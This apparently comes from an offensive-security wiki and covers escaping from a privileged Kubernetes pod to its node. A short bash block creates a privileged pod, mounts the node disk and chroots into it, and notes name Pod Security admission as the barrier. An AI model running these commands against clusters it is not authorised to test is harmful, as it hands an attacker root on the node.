---
title: "Privileged pod: escaping to the node from a privileged security context"
description: "Escaping to a Kubernetes node from a pod whose security context is privileged, which grants all capabilities and host device access, so the pod mounts the node disk or uses the release_agent escape to run as root on the node."
keywords:
  - privileged pod
  - securityContext privileged
  - node escape
  - pod security
  - kubernetes escape
---

# Privileged pod

A pod with `securityContext.privileged: true` is the Kubernetes delivery of the all-in-one privileged container: every capability, all host devices, and no default confinement. From such a pod the node is one step away, by mounting its disk or using the cgroup escape. Getting the pod scheduled is the real gate, which is Pod Security admission.

```bash
# A privileged pod spec; schedule it where admission allows
kubectl run pwn --image=alpine --privileged --command -- sleep 1d
kubectl exec -it pwn -- sh -c 'fdisk -l; mount /dev/sda1 /mnt 2>/dev/null; chroot /mnt sh'
```

## Exploitation notes

- The escape inside the pod is [Privileged flag](../../../container-escape/privileged-configuration/privileged-flag.md); the pod spec just requests it.
- The barrier is admission: Pod Security Standards at `baseline` or `restricted` reject privileged, so check the namespace's enforcement before assuming it schedules.
- Obtaining the right to create such a pod is [Pod creation to node](../rbac-privilege-escalation/pod-creation-to-node.md).

## References

- [Kubernetes: security context](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [Kubernetes: Pod Security Standards](https://kubernetes.io/docs/concepts/security/pod-security-standards/)
